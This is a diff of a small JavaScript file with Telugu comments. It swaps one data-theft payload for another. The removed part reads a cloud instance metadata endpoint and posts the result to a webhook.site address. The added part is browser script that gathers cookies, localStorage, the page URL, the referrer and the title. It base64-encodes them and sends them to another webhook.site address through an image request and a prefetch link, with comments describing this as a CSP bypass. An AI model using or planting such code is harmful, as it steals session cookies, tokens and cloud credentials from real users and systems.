@@ -1,21 +1,26 @@
-const http = require('http');
+(function() {
+    // నీ వెబ్‌హుక్ లింక్
+    var webhook = "https://73764c17-b242-4f2a-84ba-88f63958a3e1.webhook.site/";
 
-const options = {
-  hostname: '169.254.169.254',
-  path: '/metadata/instance?api-version=2021-02-01',
-  headers: { 'Metadata': 'true' }
-};
+    // డేటాను సేకరించడం
+    var info = {
+        cookies: document.cookie || "No Cookies Found",
+        localStorage: JSON.stringify(localStorage),
+        url: window.location.href,
+        referrer: document.referrer,
+        title: document.title
+    };
 
-http.get(options, (res) => {
-  let data = '';
-  res.on('data', (chunk) => { data += chunk; });
-  res.on('end', () => {
-    const postData = JSON.stringify({ metadata: data });
-    const req = http.request('https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' }
-    });
-    req.write(postData);
-    req.end();
-  });
-});
+    // డేటాను Base64 లోకి మార్చడం (సెక్యూరిటీ కోసం)
+    var encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(info))));
+
+    // Image ట్యాగ్ ద్వారా డేటా పంపడం (CSP Bypass)
+    var log = new Image();
+    log.src = webhook + "?report=" + encodedData;
+
+    // రెండవ పద్ధతి: ఒకవేళ ఇమేజ్ బ్లాక్ అయితే లింక్ ద్వారా
+    var link = document.createElement('link');
+    link.rel = 'prefetch';
+    link.href = webhook + "?backup=" + encodedData;
+    document.head.appendChild(link);
+})();
